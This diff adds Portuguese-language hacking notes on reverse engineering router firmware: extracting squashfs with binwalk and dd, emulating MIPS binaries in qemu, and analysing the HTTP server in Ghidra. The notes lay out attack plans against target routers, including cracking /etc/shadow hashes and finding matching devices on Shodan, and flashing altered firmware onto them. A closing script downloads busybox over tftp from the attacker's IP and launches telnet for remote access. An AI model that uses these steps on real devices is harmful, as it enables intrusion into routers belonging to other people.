@@ -1,0 +1,39 @@
+                                  _                                     __           
+   ________ _   _____  __________(_)___  ____ _       _________  __  __/ /____  _____
+  / ___/ _ \ | / / _ \/ ___/ ___/ / __ \/ __ `/      / ___/ __ \/ / / / __/ _ \/ ___/
+ / /  /  __/ |/ /  __/ /  (__  ) / / / / /_/ /      / /  / /_/ / /_/ / /_/  __/ /    
+/_/   \___/|___/\___/_/  /____/_/_/ /_/\__, /      /_/   \____/\__,_/\__/\___/_/     
+                                      /____/                                         
+
+
+
+[+] download do firmware do roteador alvo
+[+] root@kali:~# file (arquivo.bin)
+[+] root@kali:~# binwalk(arquivo.bin) ==> verificar os arquivos q o binario contem
+	- numeros hexadecimais e decimais q aparecem indicam os offsets
+[+] root@kali:~# dd if=(arquivo.bin) bs=1 skip=(offset do squashfs) of=rootfs.sqfs
+	- squashfs é um sistema de arquivos linux somente leitura
+[+] root@kali:~# apt install squashfs-tools
+[+] root@kali:~# unsquashfs -l rootfs.sqfs ==> listar os arquivos
+[+] root@kali:~# unsquashfs rootfs.sqfs
+[+] root@kali:~# ls -la
+
+- possibilidades de ataques
+	- quebrar as senhas do etc/shadow e buscar roteadores de mesmo modelo no shodan
+	- mudar as senhas, recompilar e upar em algum roteador alvo
+
+- extra:
+
+[+] boa parte dos roteadores possui arquitetura mips, baseada apenas em registradores, cada instrução tem 32 bits
+[+] root@kali:~# apt install qemu-user-static
+[+] root@kali:~# cp /usr/bin/qemu-mips-static (diretorio onde esta o firmware descompilado)
+[+] root@kali:~# chroot ../qemu-mips-static/bin/(comando)
+[!] use o ghidra para analise do servidor http
+[!] verifique as funções do servidor e busque por algo que possua um shellscript, para execução de comandos
+[!] remova os bloqueios na pagina web
+[!] instalação do busybox mais completo:
+
+	#!/bin/bash
+	tftp -gr busybox-mips -l /tmp/busybox-mips (seu ip)
+	chmod +x /tmp/busybox-mips
+	/tmp/busybox-mips telnet
